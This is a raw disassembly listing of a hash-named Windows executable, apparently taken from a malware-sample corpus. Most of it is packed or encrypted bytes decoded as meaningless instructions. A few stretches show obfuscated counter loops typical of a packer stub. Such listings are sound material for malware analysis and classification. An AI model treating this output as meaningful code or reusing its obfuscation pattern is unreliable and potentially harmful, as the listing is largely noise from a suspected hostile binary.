
cbe99a996c0c9c8faa31932844f7b0edd5e178acb07e3d6d27e947c0d8662863.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x4f860cf7
  40101f:	cmp    al,0xe9
  401021:	js     0x40109b
  401023:	js     0x40109d
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a66
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	fdiv   st(6),st
  4010d3:	repnz adc ecx,ebx
  4010d6:	add    bh,BYTE PTR [ebx+0x2040b270]
  4010dc:	pop    edi
  4010dd:	in     al,0x86
  4010df:	mov    ebp,0xa3e7e4f8
  4010e4:	enter  0x51ba,0xf6
  4010e8:	leave  
  4010e9:	and    eax,DWORD PTR [ebp+ecx*2+0x1f]
  4010ed:	cli    
  4010ee:	ror    BYTE PTR [edx-0x2a],1
  4010f1:	dec    ebp
  4010f2:	stos   DWORD PTR es:[edi],eax
  4010f3:	sub    edi,DWORD PTR [ecx]
  4010f5:	lahf   
  4010f6:	(bad)  [esp+edi*4+0x43d1335d]
  4010fd:	repz lahf 
  4010ff:	enter  0xed43,0xf2
  401103:	and    bh,BYTE PTR [esi]
  401105:	pop    ss
  401106:	sub    eax,0x55fb6f00
  40110b:	add    edx,esp
  40110d:	retf   
  40110e:	cdq    
  40110f:	cld    
  401110:	pop    eax
  401111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401112:	mov    eax,0x467d0308
  401117:	adc    eax,0x58a13599
  40111c:	clc    
  40111d:	stc    
  40111e:	and    BYTE PTR [edi-0xe4ee393],bl
  401124:	test   edi,edi
  401126:	xchg   edx,eax
  401127:	lds    ebx,FWORD PTR [ecx]
  401129:	cs jne 0x40115b
  40112c:	push   ss
  40112d:	ins    DWORD PTR es:[edi],dx
  40112e:	push   esp
  40112f:	stos   DWORD PTR es:[edi],eax
  401130:	jo     0x4011a5
  401132:	cli    
  401133:	inc    esp
  401134:	mov    ecx,gs
  401136:	outs   dx,BYTE PTR ds:[esi]
  401137:	mov    ds:0x7cbcf72b,al
  40113c:	jge    0x401140
  40113e:	inc    esp
  40113f:	dec    edi
  401140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401141:	xchg   ebp,eax
  401142:	pop    edx
  401143:	jmp    FWORD PTR [ecx+0xc25c43b]
  401149:	ins    DWORD PTR es:[edi],dx
  40114a:	lahf   
  40114b:	cmp    DWORD PTR [edx+0x4f],esi
  40114e:	jmp    0x1f1d:0xe61a0373
  401155:	jecxz  0x401125
  401157:	mov    bh,0x42
  401159:	xlat   BYTE PTR ds:[ebx]
  40115a:	and    al,0x65
  40115c:	mov    es,WORD PTR [ebp-0x3b993b5a]
  401162:	fsub   DWORD PTR [ebx+0x3197c3b6]
  401168:	fldcw  WORD PTR [edi+0x6d2fb858]
  40116e:	mov    bh,BYTE PTR [ebx+0x6b]
  401171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401172:	mov    edx,0x377d2ea7
  401177:	push   ss
  401178:	mov    ch,0xce
  40117a:	(bad)  
  40117b:	fwait
  40117c:	xor    al,0xf8
  40117e:	jne    0x401129
  401180:	in     eax,dx
  401181:	call   0xee0c:0xbfd1b2d9
  401188:	jmp    0x6a9aa241
  40118d:	mov    ebp,0xb0580f4b
  401192:	sahf   
  401193:	inc    edi
  401194:	popa   
  401195:	dec    ebp
  401196:	aaa    
  401197:	xchg   dh,al
  401199:	mov    al,ds:0xbc01c78a
  40119e:	jno    0x4011cf
  4011a0:	sub    bh,bl
  4011a2:	jg     0x4011a6
  4011a4:	adc    ch,bl
  4011a6:	mov    ecx,0xd0b9e70
  4011ab:	fisubr DWORD PTR [edi-0x61]
  4011ae:	jp     0x4011b8
  4011b0:	je     0x4011ba
  4011b2:	add    ebx,DWORD PTR [ecx-0x7a]
  4011b5:	jb     0x4011ab
  4011b7:	cld    
  4011b8:	mov    bh,0x93
  4011ba:	(bad)  
  4011bb:	loopne 0x401153
  4011bd:	or     bh,dh
  4011bf:	dec    ebp
  4011c0:	fild   DWORD PTR [ebx-0x59]
  4011c3:	cmp    ch,BYTE PTR [ebx]
  4011c5:	add    eax,0x394d90d5
  4011ca:	out    0x91,al
  4011cc:	cdq    
  4011cd:	inc    esi
  4011ce:	outs   dx,BYTE PTR ds:[esi]
  4011cf:	mov    esp,0xe3e0513b
  4011d4:	push   ebx
  4011d5:	sub    ecx,DWORD PTR [esi+0x75b5a167]
  4011db:	pop    edx
  4011dc:	add    BYTE PTR [ecx+0x29fd57ee],al
  4011e2:	mov    esi,0xdb13997d
  4011e7:	fisub  DWORD PTR [ebx+0x73]
  4011ea:	in     eax,0x96
  4011ec:	aas    
  4011ed:	enter  0xe63d,0xdf
  4011f1:	aaa    
  4011f2:	mov    ds:0x153280a4,al
  4011f7:	fwait
  4011f8:	xor    dh,BYTE PTR [ebx-0x5eaa2e29]
  4011fe:	repnz jecxz 0x4011f8
  401201:	xor    al,0xa2
  401203:	push   edi
  401204:	mov    al,0x4
  401206:	pop    edi
  401207:	cdq    
  401208:	mov    esp,DWORD PTR [eax+0x18eddc0c]
  40120e:	dec    edx
  40120f:	and    eax,0x7234739d
  401214:	loopne 0x401257
  401216:	push   ebp
  401217:	mov    WORD PTR [esi-0x26],cs
  40121a:	mov    cs,edi
  40121c:	cmp    ecx,DWORD PTR [eax-0xc]
  40121f:	add    eax,0x39fd1bf3
  401224:	xchg   ebp,eax
  401225:	push   0x81f3764d
  40122a:	mov    bh,0x88
  40122c:	inc    ebp
  40122d:	and    DWORD PTR [edi],ebp
  40122f:	mov    ebx,esi
  401231:	pop    eax
  401232:	push   edx
  401233:	inc    esi
  401234:	xor    DWORD PTR [edi],ebp
  401236:	xor    ebx,DWORD PTR [edx+0x35]
  401239:	push   ds
  40123a:	sbb    BYTE PTR [eax-0x54792bcf],dh
  401240:	dec    edx
  401241:	loopne 0x40120a
  401243:	mov    BYTE PTR [ecx-0x26],al
  401246:	push   es
  401247:	sbb    eax,0x656806fe
  40124c:	aam    0x97
  40124e:	inc    edx
  40124f:	and    eax,0x97bd3c3c
  401254:	jmp    0x40125e
  401256:	cmc    
  401257:	(bad)  
  401258:	cmc    
  401259:	rcl    DWORD PTR [eax-0x12],1
  40125c:	inc    edx
  40125d:	pop    edx
  40125e:	mov    ebp,0xa3bc4314
  401263:	popf   
  401264:	adc    DWORD PTR [ebx-0x4c],ebx
  401267:	mov    cl,0x4e
  401269:	sub    al,0x46
  40126b:	ja     0x401230
  40126d:	int    0x47
  40126f:	mov    dl,0x4
  401271:	stos   BYTE PTR es:[edi],al
  401272:	dec    edx
  401273:	inc    esp
  401274:	push   edi
  401275:	xchg   ebp,eax
  401276:	test   al,0x94
  401278:	jb     0x401295
  40127a:	or     DWORD PTR [edi-0x19],ebp
  40127d:	push   ebx
  40127e:	mov    ds:0x89a00c72,al
  401283:	jae    0x401281
  401285:	jns    0x401217
  401287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401288:	cwde   
  401289:	mov    eax,ds:0x52bc7b7c
  40128e:	call   0x91dce573
  401293:	hlt    
  401294:	add    ecx,edx
  401296:	dec    esp
  401297:	mov    ecx,0xb8ad71e
  40129c:	xchg   ecx,eax
  40129d:	lods   eax,DWORD PTR ds:[esi]
  40129e:	and    BYTE PTR [eax+0x1137fa8d],bl
  4012a4:	sub    DWORD PTR [edx-0xfd4e734],eax
  4012aa:	mov    ah,BYTE PTR [ecx+0x41eae6]
  4012b0:	xor    DWORD PTR ds:0x42a80d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x57],1
  401422:	mov    BYTE PTR [edi],bl
  401424:	pop    ds
  401425:	(bad)  
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401408
  40142e:	gs adc eax,0x41afced5
  401434:	aad    0xe6
  401436:	sbb    al,0xf6
  401438:	call   0x71afbacb
  40143d:	pop    esi
  40143e:	imul   esp,ecx,0xffffffab
  401441:	popf   
  401442:	mov    eax,0xf20e6d59
  401447:	leave  
  401448:	idiv   ebx
  40144a:	js     0x40143c
  40144c:	mov    eax,0x45303b78
  401451:	sub    dh,ch
  401453:	fld    QWORD PTR [bp+di-0x71]
  401457:	jae    0x4014bd
  401459:	(bad)  
  40145a:	les    eax,FWORD PTR [eax]
  40145c:	dec    edx
  40145d:	dec    ecx
  40145e:	xchg   edx,eax
  40145f:	ja     0x401402
  401461:	jbe    0x401459
  401463:	add    ch,cl
  401465:	push   cs
  401466:	icebp  
  401467:	and    eax,0x53612669
  40146c:	repnz sbb DWORD PTR [eax],eax
  40146f:	push   edx
  401470:	push   cs
  401471:	nop
  401472:	loope  0x4014ab
  401474:	push   0x78
  401476:	and    DWORD PTR [edi-0x4f],edi
  401479:	sbb    al,0x60
  40147b:	jp     0x4014e3
  40147d:	outs   dx,BYTE PTR ds:[esi]
  40147e:	inc    edx
  40147f:	int3   
  401480:	aaa    
  401481:	or     eax,0x3a70c182
  401486:	push   ss
  401487:	xor    DWORD PTR [esi+0x16a7788c],ebp
  40148d:	sahf   
  40148e:	and    esi,DWORD PTR [edi-0x4329138a]
  401494:	lods   eax,DWORD PTR ds:[esi]
  401495:	daa    
  401496:	addr16 inc edi
  401498:	mov    edx,edx
  40149a:	cli    
  40149b:	jns    0x4014b3
  40149d:	inc    esi
  40149e:	push   es
  40149f:	mov    ds:0x4f3dceb4,al
  4014a4:	pop    ebx
  4014a5:	test   eax,0xae6effeb
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	jl     0x4014e7
  4014ad:	or     al,0xc5
  4014af:	push   ebx
  4014b0:	mov    eax,ds:0xc08cf1b7
  4014b5:	push   ss
  4014b6:	push   ds
  4014b7:	aaa    
  4014b8:	data16 fadd st,st(7)
  4014bb:	sub    DWORD PTR [esi-0x19bb5aca],0x2703e82e
  4014c5:	cmp    cx,WORD PTR [ecx]
  4014c8:	push   edx
  4014c9:	jae    0x40148a
  4014cb:	add    edx,DWORD PTR [edx+0x30f2cbd1]
  4014d1:	(bad)  
  4014d2:	shl    DWORD PTR [esi],1
  4014d4:	retf   
  4014d5:	sbb    BYTE PTR [esp+edx*1+0x6e],0x71
  4014da:	pop    edi
  4014db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014dc:	cmp    esi,esi
  4014de:	jg     0x4014cd
  4014e0:	fbstp  TBYTE PTR [ecx-0x3f]
  4014e3:	mov    bl,0x7d
  4014e5:	pusha  
  4014e6:	das    
  4014e7:	jge    0x40152a
  4014e9:	pop    ecx
  4014ea:	aam    0xbe
  4014ec:	mov    ecx,0x40cfcd89
  4014f1:	mov    dl,0x1b
  4014f3:	mov    ebp,0x3a9e4741
  4014f8:	mov    dh,BYTE PTR [esi-0x61]
  4014fb:	mov    bh,0x84
  4014fd:	fmul   DWORD PTR [ebx]
  4014ff:	add    al,0x35
  401501:	xlat   BYTE PTR ds:[ebx]
  401502:	in     al,dx
  401503:	lock dec eax
  401505:	inc    esp
  401506:	call   0x765a:0xf197b1e9
  40150d:	stos   DWORD PTR es:[edi],eax
  40150e:	or     BYTE PTR [ebx],0xfa
  401511:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  401513:	call   DWORD PTR [esi]
  401515:	test   DWORD PTR [edi+0x8],ecx
  401518:	(bad)  
  401519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40151a:	push   DWORD PTR [edi]
  40151c:	pop    ebp
  40151d:	jmp    0x8872:0xdaa0d41f
  401524:	aas    
  401525:	pop    ss
  401526:	add    esp,DWORD PTR [edi+0x566b1847]
  40152c:	sbb    BYTE PTR ds:0x1b7f881e,bl
  401532:	xchg   edx,eax
  401533:	lea    ebp,[edi]
  401535:	pop    ecx
  401536:	push   ecx
  401537:	adc    BYTE PTR [ebx],cl
  401539:	pop    ebp
  40153a:	call   0xe12:0xde60850b
  401541:	lea    esi,[edx+0x27]
  401544:	cmp    eax,0xddf2c638
  401549:	dec    edi
  40154a:	cmp    al,0x9e
  40154c:	data16 jge 0x401569
  40154f:	test   al,0x27
  401551:	cdq    
  401552:	xchg   BYTE PTR ds:0x466763ef,cl
  401558:	fisttp DWORD PTR [ecx]
  40155a:	ins    BYTE PTR es:[edi],dx
  40155b:	loopne 0x40152c
  40155d:	cmp    DWORD PTR [ebp-0x70],eax
  401560:	cmp    dl,bl
  401562:	iret   
  401563:	push   eax
  401564:	(bad)  
  401565:	loop   0x401508
  401567:	gs jg  0x4014ef
  40156a:	mov    DWORD PTR [esi],edi
  40156c:	and    edi,edi
  40156e:	int    0x4e
  401570:	push   cs
  401571:	sbb    eax,DWORD PTR [eax-0x6a]
  401574:	repz push ds
  401576:	add    edi,esp
  401578:	das    
  401579:	repz imul eax,DWORD PTR [esi],0x7e526081
  401580:	mov    edx,0x3f5de72c
  401585:	fimul  WORD PTR [ebx]
  401587:	xchg   edi,eax
  401588:	test   DWORD PTR [ebx],ebx
  40158a:	mov    eax,ds:0xc4b18a2d
  40158f:	inc    eax
  401590:	outs   dx,DWORD PTR ds:[esi]
  401591:	repnz retf 0xe862
  401595:	loopne 0x40159a
  401597:	je     0x401591
  401599:	cmc    
  40159a:	lods   eax,DWORD PTR ds:[esi]
  40159b:	lahf   
  40159c:	xlat   BYTE PTR ds:[ebx]
  40159e:	mov    BYTE PTR [edx-0x695d21e8],al
  4015a4:	ret    0x8cb8
  4015a7:	sbb    eax,DWORD PTR [edi+0x9]
  4015aa:	pushf  
  4015ab:	push   esp
  4015ac:	or     dh,BYTE PTR [ebx+edi*2]
  4015af:	mov    ebp,0x1f01e025
  4015b4:	sbb    al,0xd8
  4015b6:	or     bh,dl
  4015b8:	xchg   ebx,eax
  4015b9:	push   0xffffffb3
  4015bb:	add    al,0x6a
  4015bd:	adc    ch,BYTE PTR [ecx-0x5dfb6076]
  4015c3:	inc    eax
  4015c4:	inc    edi
  4015c5:	data16 lahf 
  4015c7:	mov    WORD PTR [ebx],ss
  4015c9:	lock push es
  4015cb:	imul   eax,DWORD PTR ds:[ebp+0x5879dc70],0x11
  4015d3:	repz cmp DWORD PTR [esi+ebp*1-0x63762482],ebx
  4015db:	imul   esp,edi,0xd5c438a2
  4015e1:	pop    ss
  4015e2:	adc    dh,ah
  4015e4:	cmp    BYTE PTR ds:0x4471276f,ah
  4015ea:	add    al,0xad
  4015ec:	mov    edx,0xcd4b4e33
  4015f1:	out    0x33,al
  4015f3:	icebp  
  4015f4:	jno    0x4015e7
  4015f6:	add    esp,ebx
  4015f8:	scas   eax,DWORD PTR es:[edi]
  4015f9:	jbe    0x401626
  4015fb:	xchg   BYTE PTR [esp+eax*8+0x2],ah
  4015ff:	dec    eax
  401600:	push   0xffffff93
  401602:	sbb    DWORD PTR [edx+0x5a],ebx
  401605:	jl     0x4015ac
  401607:	test   DWORD PTR gs:[ebx-0x11473748],ebx
  40160e:	in     eax,0x89
  401610:	ret    
  401611:	and    esp,DWORD PTR [ebp+ebx*8+0x28]
  401615:	jl     0x4015dd
  401617:	xchg   ebp,eax
  401618:	push   eax
  401619:	push   ebx
  40161a:	stos   BYTE PTR es:[edi],al
  40161b:	cmp    ebp,ebp
  40161d:	and    BYTE PTR [eax-0x5c],bl
  401620:	stos   DWORD PTR es:[edi],eax
  401621:	test   BYTE PTR [eax+0x2],bl
  401624:	test   DWORD PTR [ebx-0x67],edx
  401627:	lods   ax,WORD PTR ds:[esi]
  401629:	in     eax,dx
  40162a:	mov    edi,0x4d2129f6
  40162f:	pop    ebx
  401630:	hlt    
  401631:	outs   dx,DWORD PTR ds:[esi]
  401632:	inc    esi
  401633:	push   esp
  401634:	(bad)  
  401635:	sub    ah,BYTE PTR [ebx]
  401637:	add    DWORD PTR [ecx],edx
  401639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40163a:	mov    edi,0x8c4e7499
  40163f:	ss inc edx
  401641:	push   ss
  401642:	xor    edi,DWORD PTR [edx+eax*4+0xd]
  401646:	retf   0x75fb
  401649:	cmp    eax,0xe0f121d9
  40164e:	or     al,0x52
  401650:	pop    ebp
  401651:	test   BYTE PTR [edx],cl
  401653:	push   ebx
  401654:	mov    ebp,0x40694639
  401659:	mov    ebp,0xb49b4c35
  40165e:	jle    0x401689
  401660:	mov    esp,edi
  401662:	mov    al,0x14
  401664:	cdq    
  401665:	pop    ebp
  401666:	xchg   esi,eax
  401667:	imul   edx,DWORD PTR [ecx],0xfffffff6
  40166a:	pop    ebx
  40166b:	xor    edx,0xb401261e
  401671:	test   eax,0x1b08d9
  401676:	cdq    
  401677:	jmp    0x8f58232a
  40167c:	nop
  40167d:	call   0xc86e:0xe0e9b880
  401684:	and    al,0x50
  401686:	pop    ebx
  401687:	or     bl,BYTE PTR [ebp+0x37cad5f9]
  40168d:	stc    
  40168e:	dec    ebx
  40168f:	mov    dh,0x25
  401691:	imul   ebp,DWORD PTR [eax+ecx*4-0x65],0xad62232b
  401699:	or     dh,dl
  40169b:	mov    ds:0xc460acb1,al
  4016a0:	jnp    0x4016df
  4016a2:	jge    0x4016b7
  4016a4:	rcl    DWORD PTR [eax],1
  4016a6:	(bad)  [ecx-0x77]
  4016a9:	push   ds
  4016aa:	cmp    bl,BYTE PTR [esp+ecx*1-0x38fc1b5d]
  4016b1:	xor    DWORD PTR ds:0x42a84d,0x53dc
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz out dx,al
  4016f5:	scas   al,BYTE PTR es:[edi]
  4016f6:	sar    DWORD PTR [eax+0x7c],0x3
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x40174b
  401701:	scas   eax,DWORD PTR es:[edi]
  401702:	pop    edx
  401703:	clc    
  401704:	jno    0x4016f5
  401706:	sar    BYTE PTR [edx],1
  401708:	sub    eax,0x490c536c
  40170d:	mov    bh,0xd7
  40170f:	push   esp
  401710:	fucomp st(2)
  401712:	mov    BYTE PTR [eax-0x7ff8b7b6],dh
  401718:	adc    BYTE PTR [edx+ebx*4+0x7aa3892],ch
  40171f:	dec    eax
  401720:	cmp    al,0xb5
  401722:	cmp    BYTE PTR [edx-0x21340e9c],dl
  401728:	jp     0x401742
  40172a:	sbb    ebx,DWORD PTR [esi+0x79]
  40172d:	lods   eax,DWORD PTR ds:[esi]
  40172e:	es ins BYTE PTR es:[edi],dx
  401730:	xor    edx,esi
  401732:	mov    al,ds:0xa1603514
  401737:	pop    edi
  401738:	dec    eax
  401739:	mov    dh,0x3a
  40173b:	(bad)  
  40173f:	mov    al,0x36
  401741:	fcmovnu st,st(0)
  401743:	mov    ecx,0x9091dbef
  401748:	jle    0x40171c
  40174a:	retf   0x807e
  40174d:	xchg   eax,esi
  40174f:	sub    BYTE PTR [eax-0x22d3f2c0],dl
  401755:	imul   edx,DWORD PTR [ebp+0x5d332a85],0x57
  40175c:	push   ebx
  40175d:	fs das 
  40175f:	ror    DWORD PTR [edi-0x3844daca],cl
  401765:	xchg   ebx,eax
  401766:	sar    edi,0x56
  401769:	lods   eax,DWORD PTR ds:[esi]
  40176a:	pop    ecx
  40176b:	shr    DWORD PTR [ebx+0x2933e9b8],cl
  401771:	fcmovnu st,st(4)
  401773:	sbb    BYTE PTR [ecx],dh
  401775:	or     eax,0x5f3df1b9
  40177a:	jae    0x401798
  40177c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40177d:	outs   dx,BYTE PTR ds:[esi]
  40177e:	mov    edx,0x6e082e82
  401783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401784:	repz pop es
  401786:	adc    BYTE PTR [esi],al
  401788:	ret    
  401789:	or     al,0xf3
  40178b:	add    esi,DWORD PTR [ecx-0x30]
  40178e:	fidiv  WORD PTR [esi+0x7a]
  401791:	sub    DWORD PTR [ebp+0x2c],ebp
  401794:	and    ebp,DWORD PTR [ebx+0x25972045]
  40179a:	mov    ebp,0xf136519d
  40179f:	fisttp WORD PTR [edi-0x5]
  4017a2:	jp     0x4017f5
  4017a4:	xchg   edx,edi
  4017a6:	test   esi,edi
  4017a8:	out    dx,eax
  4017a9:	aas    
  4017aa:	mov    ebp,0x9f02d295
  4017af:	mov    eax,ds:0x44bb5579
  4017b4:	lods   al,BYTE PTR ds:[esi]
  4017b5:	std    
  4017b6:	shr    DWORD PTR [esi+0x6c1cc7cf],0x8b
  4017bd:	pop    edx
  4017be:	mov    edx,0x75d17790
  4017c3:	jmp    0x4017d8
  4017c5:	arpl   WORD PTR [ecx-0x4f4810a6],si
  4017cb:	ret    
  4017cc:	loop   0x4017a7
  4017ce:	push   eax
  4017cf:	iret   
  4017d0:	out    dx,eax
  4017d1:	push   ss
  4017d2:	add    dl,bh
  4017d4:	mov    ds:0x16187528,eax
  4017d9:	ret    0x348d
  4017dc:	cmp    edx,DWORD PTR [eax+0x47]
  4017df:	mov    ds:0x30743427,al
  4017e4:	test   DWORD PTR [eax-0x43b37015],ebx
  4017ea:	pop    edi
  4017eb:	sub    al,0x2
  4017ed:	sub    edx,DWORD PTR [ecx-0x6dae47b5]
  4017f3:	adc    esi,DWORD PTR [edx+0x62]
  4017f6:	mov    ds:0x8aeb10b5,eax
  4017fb:	jnp    0x401833
  4017fd:	dec    ecx
  4017fe:	xchg   esp,eax
  4017ff:	ins    DWORD PTR es:[edi],dx
  401800:	mov    al,0xe8
  401802:	jae    0x401800
  401804:	sbb    esi,DWORD PTR [edx+0x7b]
  401807:	mov    ch,0x64
  401809:	retf   0x2681
  40180c:	sahf   
  40180d:	sub    BYTE PTR ds:0x5857b630,dl
  401813:	ja     0x401828
  401815:	pop    edx
  401816:	add    eax,0x2e660985
  40181b:	dec    edi
  40181c:	nop
  40181d:	jne    0x401895
  40181f:	inc    ecx
  401820:	int    0x61
  401822:	cdq    
  401823:	fld    DWORD PTR [ebx+0x12]
  401826:	jne    0x4018a4
  401828:	mov    dh,0xaa
  40182a:	test   cl,bh
  40182c:	adc    bl,BYTE PTR [ecx+0xa]
  40182f:	js     0x4018ab
  401831:	xchg   ebx,eax
  401832:	push   0xffffff8c
  401834:	mov    ebp,0x2dbc0ee6
  401839:	(bad)
  40183d:	xor    DWORD PTR [bx+di-0x2324],edi
  401842:	lahf   
  401843:	mov    ds:0xe139e918,eax
  401848:	mov    ebp,ebx
  40184a:	adc    DWORD PTR [edi-0x1a459e62],eax
  401850:	pop    es
  401851:	sbb    BYTE PTR [ecx-0x7f],al
  401854:	and    al,0x47
  401856:	mov    esi,0x6c5c6dc2
  40185b:	dec    esi
  40185c:	fsubr  QWORD PTR [ebx]
  40185e:	mov    ebx,0x542d0ae0
  401863:	test   al,0x5a
  401865:	and    ch,cl
  401867:	out    dx,al
  401868:	push   eax
  401869:	int3   
  40186a:	xor    eax,0x56ab116
  40186f:	hlt    
  401870:	add    al,0x7c
  401872:	retf   0x2055
  401875:	retf   
  401876:	add    ebx,0x6f
  401879:	int    0x84
  40187b:	mov    cl,0x54
  40187d:	mov    esi,0x20f926aa
